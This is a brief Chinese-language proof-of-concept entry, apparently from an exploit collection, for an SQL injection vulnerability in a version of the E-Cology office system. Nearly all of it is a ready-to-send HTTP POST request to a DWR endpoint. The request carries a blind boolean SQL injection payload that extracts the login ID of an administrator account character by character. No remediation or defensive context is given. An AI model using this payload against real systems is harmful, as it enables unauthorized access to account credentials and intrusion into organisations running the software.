## 某微 E-Cology 某版本 SQL注入漏洞
```
POST /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Content-Length: 191
Accept-Encoding: gzip
Connection: close
Content-Type: text/plain
 
callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
c0-param1=string:1
batchId=0
```
![3a380d7bbc888fb3314bb6b512b4e7db](https://github.com/wy876/POC/assets/139549762/6d40d284-0894-4c18-89dc-5a978d4f5c79)

